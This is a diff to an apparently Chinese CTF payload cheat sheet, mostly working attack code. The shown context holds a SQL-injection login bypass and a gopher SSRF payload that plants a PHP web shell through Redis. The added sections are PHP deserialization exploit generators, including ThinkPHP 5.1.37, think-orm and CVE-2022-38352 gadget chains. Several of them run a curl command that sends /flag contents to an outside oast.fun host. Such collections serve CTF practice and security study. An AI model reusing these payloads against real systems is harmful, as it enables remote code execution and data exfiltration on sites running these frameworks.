@@ -140,6 +140,7 @@ print(resp.text)
 ```shell
 docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o msg1.bin msg2.bin
 ```
+
 ## SQL注入
 ### SQL注入-001
 > 万能密码 `?username=admin' or 1=1 --+&password=1`
@@ -287,4 +288,479 @@ gopher 协议 攻击 内网
 ```text
 curl -X POST http://127.0.0.1:1408/ -d 'proxy=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A'
 curl http://127.0.0.1:1408/shell.php?cmd=cat+/flag
+```
+
+## 反序列化
+
+### 反序列化-PHP-001
+```php 
+<?php
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+$show = new Show('system("cat /flag");');
+echo base64_encode(serialize($show));
+```
+
+### 反序列化-PHP-002
+```php 
+<?php
+class User
+{
+    public $username;
+    public function __construct($username)
+    {
+        $this->username = $username;
+    }
+}
+
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+$user = new User('system("cat /flag");');
+$show = new Show($user);
+
+echo base64_encode(serialize($show));
+
+```
+
+### 反序列化-PHP-003
+```php
+<?php
+
+class ZhangSan
+{
+    public $name;
+    public function __construct($name)
+    {
+        $this->name = $name;
+    }
+}
+
+class User
+{
+    public $username;
+    public function __construct($username)
+    {
+        $this->username = $username;
+    }
+}
+
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+
+
+$zhangsan = new ZhangSan('system("cat /flag");');
+$user = new User($zhangsan);
+$show = new Show($user);
+var_dump($show);
+echo base64_encode(serialize($show));
+```
+
+### 反序列化-PHP-004
+> CVE-2016-7124
+```php
+<?php
+
+class ZhangSan
+{
+    public $name;
+    public function __construct($name)
+    {
+        $this->name = $name;
+    }
+}
+
+class User
+{
+    public $username;
+    public function __construct($username)
+    {
+        $this->username = $username;
+    }
+}
+
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+
+
+$zhangsan = new ZhangSan('system("cat /flag");');
+$user = new User($zhangsan);
+$show = new Show($user);
+$tmp = serialize($show);
+// 正则替换
+$tmp = preg_replace('/"Show":1/','"Show":2',$tmp);
+echo base64_encode($tmp);
+```
+
+### 反序列化-PHP-005
+> php引用赋值&
+```php
+<?php
+
+class ZhangSan
+{
+    public $name;
+    public function __construct($name)
+    {
+        $this->name = $name;
+    }
+}
+
+class User
+{
+    public $username;
+    public function __construct($username)
+    {
+        $this->username = $username;
+    }
+}
+
+class Show
+{
+    public $show;
+    public $key;
+    public $wakeup;
+    public function __construct($show)
+    {
+        $this->key = &$this->wakeup;
+        $this->show = $show;
+        
+    }
+}
+
+
+$zhangsan = new ZhangSan('system("cat /flag");');
+$user = new User($zhangsan);
+$show = new Show($user);
+$tmp = serialize($show);
+echo base64_encode($tmp);
+```
+
+### 反序列化-PHP-006
+> fast-destruct
+>
+> `unserialize()`函数在扫描到序列化字符串格式有误时会提取触发对象的`__destruct()`方法导致命令执行
+```php
+<?php
+
+class ZhangSan
+{
+    public $name;
+    public function __construct($name)
+    {
+        $this->name = $name;
+    }
+}
+
+class User
+{
+    public $username;
+    public function __construct($username)
+    {
+        $this->username = $username;
+    }
+}
+
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+
+
+$zhangsan = new ZhangSan('system("cat /flag");');
+$user = new User($zhangsan);
+$show = new Show($user);
+$tmp = serialize($show);
+// 在 最后添加一个 ;1}}}
+$tmp = preg_replace('/;}}}$/',';1}}}',$tmp);
+echo base64_encode($tmp);
+```
+
+### 反序列化-PHP-007
+> 使用C绕过
+```php
+<?php
+class Show
+{
+    public $show;
+    public function __construct($show)
+    {
+        $this->show = $show;
+    }
+}
+$show = new Show('system("cat /flag");');
+//$arr = array("xxx"=>$show);
+$aro =new ArrayObject($show);
+
+echo base64_encode(serialize($aro));
+
+```
+
+### 反序列化-PHP-008
+> thinkphp v5.1.37 反序列化漏洞
+>
+> www.zip 获取源码
+```php
+<?php
+
+namespace think;
+abstract class Model{
+    protected $append = [];
+    private $data = [];
+    function __construct(){
+        $this->append = ["ethan"=>["a","2"]];
+        $this->data = ["ethan"=>new Request()];
+    }
+}
+class Request
+{
+    protected $hook = [];
+    protected $filter = "system";
+    protected $config = ["var_pjax"=>''];
+    protected $param = ["curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\""];
+    protected $mergeParam =true;
+    function __construct(){
+        $this->hook = ["visible"=>[$this,"isPjax"]];
+    }
+}
+namespace think\process\pipes;
+
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+{
+    private $files = [];
+
+    public function __construct()
+    {
+        $this->files=[new Pivot()];
+    }
+}
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+{
+}
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+
+```
+
+### 反序列化-PHP-009
+> thinkphp v5.1.37 反序列化漏洞 POC 2
+>
+> www.zip 获取源码
+```php
+<?php
+namespace think;
+abstract class Model {
+
+    protected $append = [];
+    private $relation = [];
+    protected $visible = [];
+    protected $strict = true;
+    private $data = [];
+    private $withAttr = [];
+    function __construct(){
+           $this->visible = array("foo"=>array());
+           $this->relation = array("foo"=>"curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\"");
+           $this->withAttr = array("foo"=>"system");
+    }
+}
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model {
+
+}
+
+namespace think\process\pipes;
+
+use think\model\Pivot;
+class Windows
+{
+    private $files = [];
+
+    public function __construct()
+    {
+        $this->files=[new Pivot()];
+    }
+}
+
+
+
+
+
+use think\process\pipes;
+echo base64_encode(serialize(new Windows()));
+```
+
+### 反序列化-PHP-010
+> thinkphp  (topthink/think-orm =  v2.0.24 ) 反序列化漏洞 POC 
+>
+> www.zip 获取源码
+```php
+<?php
+
+namespace think;
+abstract class Model {
+
+    private $lazySave = false;
+    private $exists = false;
+    private $data = [];
+    protected $suffix = "";
+    protected $name = null;
+    protected $connection = "mysql";
+
+    protected $append = [];
+    private $relation = [];
+    protected $visible = [];
+    protected $strict = true;
+    private $withAttr = [];
+
+
+    function __construct($obj){
+        if ($obj == null) {
+            $this->visible = array("foo"=>array());
+            $this->relation = array("foo"=>"curl http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun -d \"$(cat /flag)\"");
+            $this->withAttr = array("foo"=>"system");
+        }else{
+            $this->lazySave = true;
+            $this->exists = true;
+            $this->data= array("foo"=>"");
+            $this->name=$obj;
+        }
+
+
+    }
+}
+
+
+
+
+
+
+namespace think\model;
+class Pivot extends \think\Model{
+
+}
+
+namespace think\model;
+echo base64_encode(serialize(new Pivot(new Pivot(null))));
+
+```
+
+### 反序列化-PHP-011
+> Thinkphp CVE-2022-38352
+```php
+<?php
+namespace think\view\driver;
+class Php
+{
+}
+
+namespace think;
+class App {
+    protected $instances = [];
+
+    public function __construct()
+    {
+        $this->instances = [
+            "think\Request"=>new Request(),
+        ];
+
+    }
+}
+class Request {
+    protected $url;
+
+    public function __construct()
+    {
+        $this->url = '<?php system("cat /flag");exit(); ?>';
+    }
+}
+
+
+namespace think\log\driver;
+use think\App;
+use think\view\driver\Php;
+
+class Socket {
+    protected $config;
+    protected $app;
+    protected $clientArg;
+    public function __construct()
+    {
+        $this->config = [
+            "force_client_ids" => true,
+            "allow_client_ids"=> [],
+            "debug" => true,
+            "format_head"=> [new Php(),"display"]
+        ];
+        $this->app = new App();
+        $this->clientArg = ["tabid"=>"1"];
+    }
+}
+
+
+namespace think\log;
+use think\log\driver\Socket;
+
+class Channel {
+    protected $logger;
+    protected $lazy = false;
+    public function __construct()
+    {
+        $this->lazy = false;
+        $this->logger = new Socket();
+    }
+}
+
+
+namespace League\Flysystem\Cached\Storage;
+
+
+use think\log\Channel;
+
+class Psr6Cache
+{
+    protected $autosave = false;
+    private $pool;
+    function __construct(){
+        $this->pool =new Channel();
+    }
+
+}
+
+
+echo base64_encode(serialize(new Psr6Cache()));
 ```
